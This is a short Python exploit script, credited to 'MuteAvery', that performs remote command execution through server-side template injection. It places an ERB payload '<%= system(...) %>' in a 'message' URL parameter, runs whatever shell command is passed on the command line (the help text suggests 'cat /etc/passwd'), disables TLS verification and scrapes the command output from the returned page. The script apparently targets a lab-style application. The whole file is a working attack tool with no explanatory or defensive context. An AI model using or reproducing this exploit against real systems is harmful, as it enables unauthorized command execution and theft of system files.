#Author MuteAvery

import argparse
import requests
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', required=True, help="The base URL of the target")
parser.add_argument('-p', '--payload', required=True, help="The payload, e.g., cat /etc/passwd")
args = parser.parse_args()

def exploit(url, payload):
    uri = f"/?message=<%= system('{payload}') %>"
    full_url = url + uri
    print(f"[+] Sending payload {full_url}")
    r = requests.get(full_url, verify=False)
    
    if r.status_code == 200:
        print("[+] Payload sent successfully\n")
        html_lines = r.text.splitlines()
        inside_div = False
        result_lines = []
        reached_section = False
        

        if len(html_lines) >= 48:
            for line in html_lines[47:]: 
                if re.search(r'true', line):
                    reached_section = True
                    break
                if not re.search(r"\$\d+(\.\d{2})?", line):  
                    result_lines.append(line.strip())
        if result_lines:
            cleaned_result = "\n".join(result_lines).replace("<div>", "").replace("</div>", "")
            print(cleaned_result)
        else:
            print("[-] No valid content found within the filtered lines.")
    else:
        print(f"[-] Payload failed to send. HTTP status code: {r.status_code}")

def main():
    url = args.url.rstrip("/")  
    payload = args.payload
    exploit(url, payload)

if __name__ == "__main__":
    main()
